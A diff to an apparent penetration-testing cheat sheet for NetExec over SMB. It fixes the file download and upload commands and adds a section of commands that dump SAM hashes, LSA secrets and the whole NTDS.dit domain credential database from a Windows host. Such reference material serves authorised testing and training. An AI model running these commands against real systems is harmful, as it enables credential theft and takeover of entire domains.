@@ -54,13 +54,23 @@ nxc smb 10.10.10.10 -u alice -p Winter2020! --shares
 ### Download File
 
 ```bash
-nxc smb 10.10.10.10 -u <user> -p <pass> --exec "get \\10.10.10.10\C$\Users\Public\loot.txt loot.txt"
+nxc smb 10.10.10.10 -u <user> -p <pass> --get-file "\\Users\\Public\\loot.txt" loot.txt --share C$
 ```
 
 ### Upload File
 
 ```bash
-nxc smb 10.10.10.10 -u <user> -p <pass> --exec "put local.exe \\10.10.10.10\C$\Temp\local.exe"
+nxc smb 10.10.10.10 -u <user> -p <pass> --put-file local.exe "\\Temp\\local.exe" --share C$
+```
+
+### Dump SAM / LSA / NTDS
+
+Always try these with local admin or DA — often yields immediate credentials or the whole domain:
+
+```bash
+nxc smb 10.10.10.10 -u Administrator -p <pass> --sam     # local SAM hashes
+nxc smb 10.10.10.10 -u Administrator -p <pass> --lsa     # LSA secrets (cached creds, service accounts)
+nxc smb 10.10.10.10 -u Administrator -p <pass> --ntds    # full NTDS.dit dump (run against DC)
 ```
 
 ---
